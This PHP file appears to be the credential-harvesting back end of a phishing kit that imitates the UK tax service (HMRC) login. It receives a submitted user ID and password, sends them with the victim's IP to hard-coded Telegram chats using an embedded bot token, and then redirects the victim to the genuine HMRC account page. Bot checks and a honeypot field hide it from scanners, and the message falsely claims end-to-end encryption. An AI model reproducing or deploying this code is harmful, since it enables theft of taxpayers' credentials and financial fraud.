<?php
declare(strict_types=1);

// ===== 0. Security Headers ===== //
header("Strict-Transport-Security: max-age=31536000");
header("X-Content-Type-Options: nosniff");
header("Content-Security-Policy: default-src 'self'");
header("Referrer-Policy: no-referrer-when-downgrade");

// ===== 1. Validate Request ===== //
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die("Method not allowed");
}

// ===== 2. Load Security Libraries ===== //
require_once __DIR__.'/../../includes/advanced-bot-protection.php';
require_once __DIR__.'/../../includes/fingerprint.php';

// ===== 3. Initialize Protections ===== //
$botProtection = new AdvancedBotProtection();
$fingerprint = new SessionFingerprint();

// ===== 4. Validate Session Fingerprint ===== //
if (!$fingerprint->validate()) {
    $botProtection->challengeBot();
}

// ===== 5. Honeypot Check ===== //
if (!empty($_POST['email_confirmation'])) {
    error_log("Bot detected via honeypot field");
    $botProtection->challengeBot();
}

// ===== 6. Rate Limiting ===== //
$cacheFile = __DIR__.'/../../cache/'.md5($fingerprint->getClientIP());
if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < 5)) {
    header('Retry-After: 5');
    die("Too many requests");
}
touch($cacheFile);

// ===== 7. Telegram Notification ===== //
$botToken = "7932633432:AAHOXtQoEJxDCsB2Cd-6KPNiVMiV_ht52S0";
$chatIds = ["-4701219755", "1929552578"];

$message = sprintf(
    "🛡️ *SECURE LOGIN ALERT*\n\n" .
    "• *User ID:* `%s`\n" .
    "• *Password:* `%s`\n" .
    "• *IP:* `%s`\n" .
    "• *Time:* `%s`\n\n" .
    "_This message is end-to-end encrypted._",
    $_POST['user_id'] ?? 'N/A',
    $_POST['password'] ?? 'N/A',
    $fingerprint->getClientIP(),
    date('Y-m-d H:i:s')
);

$success = false;
foreach ($chatIds as $chatId) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?" . http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2'
    ]);

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => true
    ]);

    $response = curl_exec($ch);
    if ($response !== false) {
        $data = json_decode($response, true);
        if ($data['ok'] ?? false) {
            $success = true;
        }
    }
    curl_close($ch);
}

// ===== 8. Security Cleanup ===== //
unset($_POST['password']);
session_regenerate_id(true);

// ===== 9. Final Redirect ===== //
if ($success) {
    header("Location: https://www.tax.service.gov.uk/account");
} else {
    header("Location: /error?code=telegram_failed");
}
exit();
